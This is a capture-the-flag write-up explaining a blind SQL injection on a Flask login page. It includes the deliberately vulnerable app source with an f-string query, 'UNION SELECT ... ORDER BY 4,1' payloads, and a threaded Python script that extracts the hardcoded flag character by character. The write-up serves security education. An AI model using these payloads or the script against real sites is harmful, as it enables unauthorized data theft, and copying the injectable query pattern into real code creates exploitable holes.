
<div>03/05/2022</div>
@alguien, shared an amazing CTF challenge. I tried to figure it out and learned a lot along the way. I had to wait until he showed how to solve 
it because I couldn't do it.

The challenge is up on http://challenge.alguien.site:31337/ \
There is a simple login form where we can try to log in with different default credentials.

One of the first attemps is to try SQL injections, like `admin' or '1'='1' --` but it throws an error.
<img src="https://github.com/stevenvegar/CTF-Writeups-and-Tools/blob/main/HackOrGame/SQLinjection/login-error.png" width="500">

Now, let's take a look into the page source code, this is always the first step in every web app hacking. Here, we can find a clue.

```html
<script>debug = () => {var xhttp = new XMLHttpRequest(); xhttp.open('DEBUG', '/', true); xhttp.send();}</script>
```

This is a javascript function called "debug()". If we execute that function in the console from the developer tools of the browser, it will make a DEBUG request to the server, if we go to the network tab, we can see that it returns some code, in the Response tab we can see it. For our lucky, it returns the source code used on this web application: [app.py](https://github.com/stevenvegar/CTF-Writeups-and-Tools/blob/main/HackOrGame/SQLinjection/app.py)

```python
from flask import Flask, render_template, request
import sqlite3, os

FLAG = os.getenv('FLAG') or 'FLAG{dummy_flag}'
app = Flask(__name__)

def check_login(username, password):
    con = sqlite3.connect('database.db')
    cur = con.cursor()
    try:
        res = cur.execute(f"select 1,'admin','123456','{FLAG}' from users where username='{username}'").fetchone()
    except:
        return False
    finally:
        cur.close()
        con.close()
    if res is None:
        return False
    if password == res[2]:
        return True
    return False

@app.route('/', methods=['GET', 'DEBUG'])
def index():
    if request.method == 'DEBUG':
        return open(__file__, 'rt').read()
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    if check_login(username, password):
        return render_template('index.html', success='Nice, you are logged in! But... Where is the flag?')
    return render_template('index.html', error='Sorry, your username or password is bad')

def create_database():
    con = sqlite3.connect('database.db')
    cur = con.cursor()
    cur.execute('create table users (id integer primary key, username varchar(100), password varchar(100), flag varchar(100))')
    cur.execute("insert into users values (1, 'admin', '123456', '')")
    con.commit()
    cur.close()
    con.close()

if __name__ == '__main__':
    # create_database()     # the database already exists
    app.run(debug=True)
```

With this code we can see some important things:
 1. The correct credentials of the login form are admin:123456
 2. A sqlite3 database
 3. The database has a table (users) with 4 columns (id, username, password and flag)
 4. The code used to create the database and each value types
 5. The query executed when we try to log in

If we look at the command issued to create the database, there is NO values inserted into the flag column, instead, the flag is hardcoded into the query executed when we try to log in, also the password, so, the database is just giving the username.

There are two kinds of SQL Injections, one is trying to get information INSERTED INTO THE DATABASE and other not very common that tries to get the information HARDCODED WITHIN THE QUERIES. We are in front of the second one and this is why a normal SQL injection will fail in this case, because the database doesn't have the flag and tools like sqlmap will fail.

We are facing here a BLIND injection, because we don't see the information reflected on the website, we only receive a "correct login" message when the entered data is ok or "incorrect login" when the sent data is not ok. The technique we can do here is the UNION SELECT based on the query the website is executing.

To exfiltrate the data, we can take advantage of the ["ORDER BY"](https://www.sqlitetutorial.net/sqlite-order-by/) command. What this will do is sort the information we providde with the information stored in the original query. After the SELECT command, we need to provide 4 values separated by , to match the 4 values in the original query. The "ORDER BY 4,1" command will sort by the 4th column of the data first (the flag column) and if those values are the same, it will sort by the 1st column then, and since we give a 0 as id, our data will always be on top when the flags values become the same. And this is very important because of the [.fetchone()](https://www.tutorialspoint.com/what-is-the-fetchone-method-explain-its-use-in-mysql-python) function in the python script, it will grab only the first row as the query result.

Let's see an example: \
Injected code: `admin' UNION SELECT 0,'x','y','z' ORDER BY 4,1 --` \
Original query: `SELECT 1,'admin','123456','{FLAG}' FROM users WHERE username='{username}'` \
Executed query: `SELECT 1,'admin','123456','{FLAG}' FROM users WHERE username='admin' UNION SELECT 0,'x','y','z' ORDER BY 4,1 --'` \
Let's imagine a table created by the "ORDER BY" command is like this:

| id | username | password | flag |
| --- | --- | --- | --- |
| 1 | admin | 123456 | {flag} |
| 0 | x | y | z |

Now, why it is in that order? Because the flag probably starts with a letter that is minor than the lowecase "z". This is ordered according to its place in the ascii character table. Let's think that the flag starts with the uppercase "F" or with the lowercase "f", or even any other character. Regarding the [ascii table](https://www.rapidtables.com/code/text/ascii-table.html) they have the following decimal value:
   - F -> 70
   - f -> 102
   - z -> 122

Remember, when we are dealing with Blind SQL injections, we will only get `True` or `False` responses. In this case we will play with the information already stored in the original query and the data we are sending to the server. For example, let's send the following injection codes into the application and see what kind of responses we get:
```
"admin' UNION SELECT 0,'x','y','F' ORDER BY 4,1 --" >>> False
"admin' UNION SELECT 0,'x','y','G' ORDER BY 4,1 --" >>> True
```
The .fetchone() function will grab the top result in the "ORDER BY" table, so the first injection is returning `False` because the password we are sending ("123456") is NOT matching with the data in the first row. As we are getting `False` the returned message is "Sorry, your username or password is bad".
| id | username | password | flag |
| --- | --- | --- | --- |
| 0 | x | y | F |
| 1 | admin | 123456 | F???????? |
<img src="https://github.com/stevenvegar/CTF-Writeups-and-Tools/blob/main/HackOrGame/SQLinjection/false-result.png" width="700">

The second injected code will return `True` because now, the table is ordered upside down. The first row has the information of the original query and the password is matching with it. Now, we get the message "Nice, you are logged in! But... Where is the flag?".
| id | username | password | flag |
| --- | --- | --- | --- |
| 1 | admin | 123456 | F???????? |
| 0 | x | y | G |
<img src="https://github.com/stevenvegar/CTF-Writeups-and-Tools/blob/main/HackOrGame/SQLinjection/true-result.png" width="700">

Sounds confusing, but, with some practice and successful and failed attempts, you will get it.

Moving forward with the testing, it's very probably the beginning of the flag is "Flag{" or "FLAG{", so, let's skip that characters and continue guessing the next letter:
```
"admin' UNION SELECT 0,'x','y','FLAG{E' ORDER BY 4,1 --" >>> False
"admin' UNION SELECT 0,'x','y','FLAG{F' ORDER BY 4,1 --" >>> True
```
This means the flag starts with capital "E". We have "FLAG{E" so far. But, to avoid fatigue and feed our lazyness, let's create a Python script to help us automating the bunch of queries it need to get the complete flag. =D

```Python
import requests, time
from concurrent.futures import ThreadPoolExecutor

url = "http://challenge.alguien.site:31337/login"
success = "Nice, you are logged in! But... Where is the flag?"
failed = "Sorry, your username or password is bad"
username = "admin"
password = "123456"

def check_flag(i):
	character = chr(i)
	payload = "admin' union select 0,'x','y','" + flag + character + "' order by 4,1 --"
	req = requests.post(url, data={"username": payload, "password": password})
	if success in req.text:
		return chr(i-1)

def concurrent_reqs():
	letter = []
	with ThreadPoolExecutor() as executor:
		try:
			threads = executor.map(check_flag,range(33,127))
			for l in threads:
				if l is not None:
					letter.append(l)
					executor.shutdown(cancel_futures=True)
		except:
			pass		
	return letter[0]

def get_flag():
	global flag
	flag = ""
	while "}" not in flag:
		flag += concurrent_reqs()
		print (flag, end="\r", flush=True)
	return flag

if __name__ == '__main__':
	start = time.perf_counter()
	print ("Getting the flag...")
	print (get_flag())
	stop = time.perf_counter()
	print(f"Cracking time - {round(stop - start, 2)} second(s).")
```

The first function check_flag(i) will receive a number and it will convert it into the ASCII character with the char() function, then, it will append this character to the previous captured flag and send it as a payload in a request to the website. It will return the last failed character in the SQL injection. \
The second function concurrent_reqs() utilize a feature on Python called concurrent.futures, what it does is just to execute the desired function with different argument values at the same time. So, instead of executing it one number by one, it will send all the requests at once. \
The get_flag() function is just getting the correct letter from the functions above and printing the in the same line. \
Finally, the __main__ fucntion is executing the whole code but putting a time benchmark, just to know how many time it gets until the flag is guessed.
<img src="https://github.com/stevenvegar/CTF-Writeups-and-Tools/blob/main/HackOrGame/SQLinjection/exploit.png" width="550">

If you want to execute the vulnerable code, just execute the app.py script, modify it to create the database first, then put in the same directory index.html and the folder "templates" which have the same index.html file. It should work properly on localhost.

Also, check out the scripts made by @alguien and @XenoMuta:
  - [solve.py](https://github.com/stevenvegar/CTF-Writeups-and-Tools/blob/main/HackOrGame/SQLinjection/solve.py)  -> Implemented Binary Search
  - [xm-exploit.py](https://github.com/stevenvegar/CTF-Writeups-and-Tools/blob/main/HackOrGame/SQLinjection/xm-exploit.py)
